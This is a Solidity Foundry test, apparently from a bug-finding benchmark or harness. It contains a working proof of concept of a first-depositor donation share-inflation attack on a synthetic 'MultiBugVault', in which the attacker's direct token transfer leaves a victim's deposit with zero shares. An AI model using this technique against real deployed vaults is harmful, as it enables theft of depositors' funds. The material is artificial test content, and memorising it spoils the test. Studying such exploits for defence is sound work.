// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ClassInvariants} from "./Invariants.sol";
import {MultiBugVault, IERC20} from "../src/MultiBugVault.sol";
import {MockToken} from "../src/SyntheticVault.sol";

/// PoC for BUG-A: first-depositor donation share inflation in MultiBugVault.deposit().
contract AttackHarness_multi_v2_1 is ClassInvariants {
    address attacker;
    address victim;
    MockToken token;
    MultiBugVault vault;
    uint256 attackerTokenBefore;

    function setUp() public {
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        token = new MockToken();
        vault = new MultiBugVault(IERC20(address(token)));
        token.mint(attacker, 1000e18);
        token.mint(victim, 100e18);
        attackerTokenBefore = token.balanceOf(attacker);
    }

    function testPoC_multi_v2_1() public {
        require(vault.totalShares() == 0, "pre: totalShares should be 0");

        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        token.transfer(address(vault), 100e18);
        vm.stopPrank();

        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(50e18);
        require(vault.shares(victim) == 0, "victim should get 0 shares (donation inflation)");
        vm.stopPrank();

        vm.startPrank(attacker);
        vault.withdraw(1);
        vm.stopPrank();

        assertAttackerTokenIncreased(attacker, address(token), attackerTokenBefore, 1e18);
    }
}
